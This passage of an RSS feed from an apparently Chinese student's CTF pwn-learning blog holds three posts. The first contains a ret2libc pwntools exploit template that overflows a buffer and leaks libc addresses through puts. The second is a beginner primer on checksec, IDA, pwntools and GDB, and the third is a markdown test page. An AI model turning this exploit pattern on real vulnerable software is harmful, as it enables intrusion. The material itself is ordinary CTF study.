function&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;puts_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; #puts的入口地址，即plt表的地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;main_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; #程序的起始地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;板子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#板子&#34;&gt;#&lt;/a&gt; 板子&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;from pwn import *&lt;br&gt;
libc = ELF(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)&lt;br&gt;
p = process(&amp;quot;ret2libc&amp;quot;)&lt;br&gt;
pop_rdi_ret_addr = 0x401293&lt;br&gt;
read_got = 0x403368&lt;br&gt;
puts_plt = 0x401060&lt;br&gt;
main_addr = 0x401176&lt;br&gt;
offset = 40&lt;br&gt;
payload = b&amp;quot;a&amp;quot; * offset&lt;br&gt;
payload += p64(pop_rdi_ret_addr)&lt;br&gt;
payload += p64(read_got)&lt;br&gt;
payload += p64(puts_plt)&lt;br&gt;
payload += p64(main_addr)&lt;br&gt;
#attach(p,&amp;quot;b *0x40121e&amp;quot;)&lt;br&gt;
p.recvuntil(&amp;quot;Pls Input&amp;quot;)&lt;br&gt;
#pause()&lt;br&gt;
p.send(payload)&lt;br&gt;
 read_real_addr = u64 (p.recvuntil (&#39;\x7f&#39;)[-6:].ljust (8, b&#39;\x00&#39;))  #read 函数的真实地址，由于真实地址总是从 7f 开始，故从 7f 开始接收，长度补足 8 个字节&lt;br&gt;
 print (&amp;quot;read_real_addr:&amp;quot;, hex (read_real_addr))&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;剩下的和 32 位的一样&lt;/p&gt;
&lt;p&gt;&lt;s&gt;好啦好啦，要刷题啦（）&lt;/s&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://jexy-kynner.github.io/2024/05/11/%E5%89%8D%E7%BD%AE/</guid>
            <title>前置</title>
            <link>http://jexy-kynner.github.io/2024/05/11/%E5%89%8D%E7%BD%AE/</link>
            <category term="Pwn" scheme="http://jexy-kynner.github.io/categories/Pwn/" />
            <pubDate>Sat, 11 May 2024 01:40:39 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;既然是记录学习历程，我觉得还是从头开始吧&lt;br&gt;
我刚开始学的时候就苦于找不到学习资源，找到了又看不懂的崩溃处境&lt;br&gt;
&lt;strong&gt;好吧，是我不会科学上网 + 本人又菜又摆的缘故&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;一般是从比赛官方下载附件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; 下载到虚拟机 打开terminal——checksec 查看保护机制&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; （拖进IDA/利用GDB，然后&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;此处省略脑子）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; 编写脚本&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;用python&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; 运行exp.py—&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;ls—&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;cat flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;linux系统命令在虚拟机中使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux系统命令在虚拟机中使用&#34;&gt;#&lt;/a&gt; Linux 系统命令（在虚拟机中使用）&lt;/h1&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nc——远端 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; ls——查看目录下文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; flag——获得flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; cd——打开文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;touch&lt;/span&gt; 文件名——创建文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; vim——编辑&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; +x ./文件名  ~或~chmod &lt;span class=&#34;token number&#34;&gt;777&lt;/span&gt; ./文件名——给文件赋权限&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; python 脚本名.py——运行脚本&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;rm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-rf&lt;/span&gt; 文件名——删除文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;ida使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ida使用&#34;&gt;#&lt;/a&gt; IDA 使用&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Tab 键从 C 语言和汇编之间切换&lt;/li&gt;
&lt;li&gt;f5 从汇编到 C 语言&lt;/li&gt;
&lt;li&gt;单击函数 + 按 n—— 重命名函数（或者右键 rename）&lt;/li&gt;
&lt;li&gt;Options-&amp;gt;General-&amp;gt;Disassembly-&amp;gt;Line Prefixes—— 看地址&lt;/li&gt;
&lt;li&gt;shift+f12—— 查看字符串，一般利用它看看有没有后门函数，\bin\sh 之类的东西&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;pwntools&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwntools&#34;&gt;#&lt;/a&gt; pwntools&lt;/h1&gt;
&lt;p&gt;from pown import*   // 调用 pwntools&lt;br&gt;
p=p.process (&amp;quot;文件名&amp;quot;) // 本地运行&lt;br&gt;
 p=remote (&amp;quot;ip&amp;quot;,port)// 打远端&lt;br&gt;
 p.send（）发送消息，消息不存在换行符&lt;br&gt;
 p.sendafter (&amp;quot;&amp;quot;)// 在读到 “” 之后发送&lt;br&gt;
 p.sendline ()—— 发送信息后换行&lt;br&gt;
 p.recvline（）接收并等待提示消息&lt;br&gt;
 p.interactive：进入交互模式，最后写&lt;br&gt;
 p.recvuntil (字符串)：接收并等待提示消息&lt;br&gt;
 gdb.attach (p, ’b * 0xfa’)：启动 gdb&lt;br&gt;
p64、p32—— 根据设置的 context 选择小端法或大端法对数字进行编码&lt;/p&gt;
&lt;h1 id=&#34;汇编&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#汇编&#34;&gt;#&lt;/a&gt; 汇编&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/06/02/t2C1cs4vg98WwQh.jpg&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;gdb调试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdb调试&#34;&gt;#&lt;/a&gt; GDB 调试&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;gdb 文件名 进入 pwndbg 动态调试&lt;/li&gt;
&lt;li&gt;break 函数名 或 break 地址值 或 break C 语言行号 设断点&lt;/li&gt;
&lt;li&gt;run/r—— 运行程序 next 步过 step 步进&lt;/li&gt;
&lt;li&gt;stack 整数 查看多少栈&lt;/li&gt;
&lt;li&gt;vmmap 显示虚拟内存空间的分布&lt;/li&gt;
&lt;li&gt;info b 查看当前的断点 d &amp;lt;num&amp;gt; 删除某一个断点&lt;/li&gt;
&lt;li&gt;s 进入函数&lt;/li&gt;
&lt;li&gt;c （continue ）让程序继续执行&lt;/li&gt;
&lt;li&gt;p &amp;amp;printf 查看 printf 函数的真实地址&lt;/li&gt;
&lt;li&gt;x/10wx 地址 查看该地址后 10 个内存单元的内容&lt;/li&gt;
&lt;li&gt;xinfo 地址 查看该地址信息，包括偏移等&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;保护机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#保护机制&#34;&gt;#&lt;/a&gt; 保护机制&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/06/02/RSdGcilVUv81L7Q.jpg&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://jexy-kynner.github.io/2024/05/10/%E6%A5%94%E5%AD%90/</guid>
            <title>楔子</title>
            <link>http://jexy-kynner.github.io/2024/05/10/%E6%A5%94%E5%AD%90/</link>
            <category term="Pwn" scheme="http://jexy-kynner.github.io/categories/Pwn/" />
            <category term="随笔" scheme="http://jexy-kynner.github.io/tags/%E9%9A%8F%E7%AC%94/" />
            <pubDate>Fri, 10 May 2024 00:39:16 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;测试markdown&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试markdown&#34;&gt;#&lt;/a&gt; 测试 markdown&lt;/h1&gt;
&lt;h2 id=&#34;唠嗑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#唠嗑&#34;&gt;#&lt;/a&gt; 唠嗑&lt;/h2&gt;
&lt;p&gt;历时 2 天终于！！！搭建好博客，把主题美化好。&lt;br&gt;
最后我竟然挑了很多二次元背景图（）&lt;br&gt;
&lt;s&gt;哦，界面的音乐还是别人的，等有时间再慢慢调吧&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;之前用的是酷狗，but 博主用的是网易云 555&lt;br&gt;
 好在一番操作音乐导入成功！&lt;br&gt;
&lt;strong&gt;注：搜索功能还没配太好，可以点击 but 搜不到&lt;/strong&gt;&lt;br&gt;
我也不知道是什么原因，不想调了，估计也没什么人搜索（）&lt;br&gt;
搭建过程不少辛酸事（U ´ᴥ` U）&lt;br&gt;
总在快成功的时候删除所有文件从头开始...&lt;br&gt;
 一想到以后每周都要写 blog.&lt;br&gt;
 还不太熟练 markdown，过来练练。&lt;/p&gt;
&lt;h1 id=&#34;一级标题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一级标题&#34;&gt;#&lt;/a&gt; 一级标题&lt;/h1&gt;
&lt;h2 id=&#34;二级&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二级&#34;&gt;#&lt;/a&gt; 二级&lt;/h2&gt;
&lt;h3 id=&#34;三级&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三级&#34;&gt;#&lt;/a&gt; 三级&lt;/h3&gt;
&lt;p&gt;哦，天哪，# 后和 - * + 要空格！！&lt;/p&gt;
&lt;p&gt;&lt;em&gt;斜体&lt;/em&gt;&lt;br&gt;
&lt;em&gt;斜体&lt;/em&gt;&lt;br&gt;
&lt;strong&gt;粗&lt;/strong&gt;&lt;br&gt;
&lt;em&gt;&lt;strong&gt;粗斜&lt;/strong&gt;&lt;/em&gt;&lt;br&gt;
&lt;s&gt;删除线&lt;/s&gt;&lt;/p&gt;
&lt;h4 id=&#34;链接测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#链接测试&#34;&gt;#&lt;/a&gt; 链接测试&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vSmV4eQ==&#34;&gt;我的博客园&lt;/span&gt;&lt;br&gt;
 [博客][1][2]&lt;br&gt;
[1]:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vSmV4eQ==&#34;&gt;https://www.cnblogs.com/Jexy&lt;/span&gt;&lt;br&gt;
[2]:&lt;a href=&#34;https://jexy-kynner.github.io/&#34;&gt;https://jexy-kynner.github.io/&lt;/a&gt;&lt;br&gt;
 文字：废话&lt;a href=&#34;https://jexy-kynner.github.io/archives/&#34;&gt; https://jexy-kynner.github.io/archives/&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;列表测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#列表测试&#34;&gt;#&lt;/a&gt; 列表测试&lt;/h4&gt;
&lt;p&gt;无序&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;g&lt;/li&gt;
&lt;li&gt;x&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;j
&lt;ul&gt;
&lt;li&gt;分级 1&lt;/li&gt;
&lt;li&gt;分级 2&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有序&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;part a&lt;/li&gt;
&lt;li&gt;part b&lt;/li&gt;
&lt;li&gt;part 3
&lt;ol&gt;
&lt;li&gt;分级 1&lt;/li&gt;
&lt;li&gt;分级 2&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;插图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#插图&#34;&gt;#&lt;/a&gt; 插图&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/1.jpg&#34; alt=&#34;Lena&#34;&gt;&lt;br&gt;
&lt;s&gt; 格式：！&lt;a href&gt;&lt;/a&gt;&lt;/s&gt;&lt;/p&gt;
&lt;h2 id=&#34;表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#表&#34;&gt;#&lt;/a&gt; 表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;学号&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;姓名&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;性别&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;年龄&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;默认左对齐&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;左&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;居中&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;右&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;引用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#引用&#34;&gt;#&lt;/a&gt; 引用&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;引用 1？&lt;br&gt;
引用 2？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;引用 3？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;代码块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码块&#34;&gt;#&lt;/a&gt; 代码块&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;成功啦成功啦&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   代码块内容&lt;span class=&#34;token number&#34;&gt;1111&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   代码块内容&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;文字特效&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文字特效&#34;&gt;#&lt;/a&gt; 文字特效&lt;/h3&gt;
&lt;p&gt;红框&lt;br&gt;
&lt;span class=&#34;kbd red&#34;&gt; 12333&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;kbd green&#34;&gt;45678&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;rainbow&#34;&gt;1234567&lt;/span&gt;&lt;br&gt;
2&lt;sup&gt;3 次方&lt;/sup&gt;&lt;/p&gt;
&lt;p&gt;隐藏文字&lt;br&gt;
！！黑幕黑幕黑幕黑幕黑幕黑幕！！： 鼠标滑过显示内容&lt;br&gt;
！！模糊模糊模糊模糊模糊模糊！！{.bulr} ： 选中文字显示内容&lt;br&gt;
！！黑幕黑幕黑幕！！: 这是黑幕&lt;br&gt;
！！模糊模糊模糊！！{.bulr}: 这是模糊&lt;/p&gt;
&lt;p&gt;折叠文字&lt;/p&gt;
&lt;details class=&#34;success&#34;&gt;&lt;summary&gt;段落是绿色的&lt;/summary&gt;&lt;div&gt;
&lt;div class=&#34;tab&#34; data-id=&#34;id3&#34; data-title=&#34;卡片1&#34;&gt;
&lt;p&gt;冰淇淋&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&#34;tab&#34; data-id=&#34;id3&#34; data-title=&#34;卡片2&#34;&gt;
&lt;p&gt;墨绿色&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;details class=&#34;info&#34;&gt;&lt;summary&gt;蓝色&lt;/summary&gt;&lt;div&gt;
&lt;div class=&#34;tab&#34; data-id=&#34;id3&#34; data-title=&#34;卡片 1&#34;&gt;
&lt;p&gt;这里是卡片 1 的内容&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&#34;tab&#34; data-id=&#34;id3&#34; data-title=&#34;卡片 2&#34;&gt;
&lt;p&gt;这里是卡片 2 的内容&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;p&gt;表情&lt;br&gt;
🎶&lt;/p&gt;
&lt;ul class=&#34;task-list danger&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_0&#34; disabled=&#34;true&#34;&gt;&lt;label for=&#34;cbx_0&#34;&gt; 这是一个小叉叉&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_1&#34; checked=&#34;true&#34; disabled=&#34;true&#34;&gt;&lt;label for=&#34;cbx_1&#34;&gt; 这是一个红色勾勾&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;基本&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&#34;note warning&#34;&gt;
&lt;p&gt;警告&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;数学公式&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msqrt&gt;&lt;mrow&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msqrt&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mn&gt;9&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\sqrt {3x-1}+(1+x)^9&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.04em;vertical-align:-0.17444499999999996em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord sqrt&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8655550000000001em;&#34;&gt;&lt;span class=&#34;svg-align&#34; style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34; style=&#34;padding-left:0.833em;&#34;&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-2.825555em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;hide-tail&#34; style=&#34;min-width:0.853em;height:1.08em;&#34;&gt;&lt;svg width=&#34;400em&#34; height=&#34;1.08em&#34; viewbox=&#34;0 0 400000 1080&#34; preserveaspectratio=&#34;xMinYMin slice&#34;&gt;&lt;path d=&#34;M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z&#34;/&gt;&lt;/svg&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.17444499999999996em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;9&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
